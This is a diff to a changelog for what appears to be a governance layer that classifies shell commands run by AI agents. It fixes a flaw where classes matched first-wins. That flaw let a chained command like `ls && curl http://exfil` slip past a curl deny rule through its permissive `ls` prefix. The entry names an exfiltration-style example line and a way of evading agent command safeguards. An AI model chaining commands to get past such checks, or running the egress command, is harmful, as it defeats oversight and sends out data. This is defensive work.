@@ -14,6 +14,14 @@ there is one, so anything here can be traced to the reasoning in
 
 ### Changed
 
+- **Command classification no longer lets declaration order decide a verdict**
+  (finding #17, D63). Every class is evaluated; a command claimed by two different
+  classes resolves to `default_to` rather than to whichever was declared first.
+  Previously a world listing a permissive class ahead of a restrictive one
+  classified `ls && curl http://exfil` by its `ls` prefix, so a tainted session was
+  allowed to run egress that bare `curl` was denied. Ranking classes by severity was
+  rejected: no semantic ordering over `SideEffectClass` exists, and deriving one from
+  enum declaration order would encode policy in enum layout.
 - **A `command_classes` classifier must declare `default_to`, and an action may have
   only one classifier** (findings #19/#20, D62). Both are now compile errors.
   Pattern matching over shell strings is always evadable; `default_to` is the
@@ -88,10 +96,9 @@ nothing in a session tells you the governance stopped applying.
 
 Open findings, all documented in the review and now tracked as issues on
 [`agentic-execution-governance`](https://github.com/sv-pro/agentic-execution-governance/issues):
-classifier class ordering is first-match-wins and a permissive class listed first
-wins on a chained command (#17); `source_channel` is pinned to `user_prompt` on live
-hosts (#21); argument aliasing and schema validation are mutually exclusive (#27).
-(#19 and #20 are fixed in Unreleased, above.)
+`source_channel` is pinned to `user_prompt` on live hosts (#21); argument aliasing
+and schema validation are mutually exclusive (#27). (#17, #19 and #20 are fixed in
+Unreleased, above.)
 
 ## [0.2.1] — 2026-08-12
 
